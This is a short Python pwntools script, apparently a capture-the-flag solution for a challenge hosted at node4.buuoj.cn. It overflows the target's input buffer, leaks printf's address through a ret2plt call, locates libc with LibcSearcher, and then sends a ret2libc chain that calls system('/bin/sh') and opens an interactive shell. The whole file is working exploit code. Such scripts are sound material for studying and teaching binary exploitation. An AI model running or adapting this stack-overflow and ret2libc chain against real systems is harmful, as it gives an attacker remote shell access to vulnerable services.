from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28953)
elf = ELF('./pwn')

payload = b'crashme\x00'
payload += cyclic(2 + 4*4)
payload += p32(elf.plt['printf'])
payload += p32(elf.symbols['chall'])
payload += p32(elf.got['printf'])

io.sendlineafter(b'> ', payload)

io.recvuntil(b'crashme!\n')
printf = u32(io.recv(4))

print(hex(printf))

libc = LibcSearcher('printf', printf)
base = printf - libc.dump('printf')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = b'crashme\x00'
payload += cyclic(2 + 4*4)
payload += p32(sys)
payload += p32(0xdeadeef)
payload += p32(binsh)

io.sendline(payload)

io.interactive()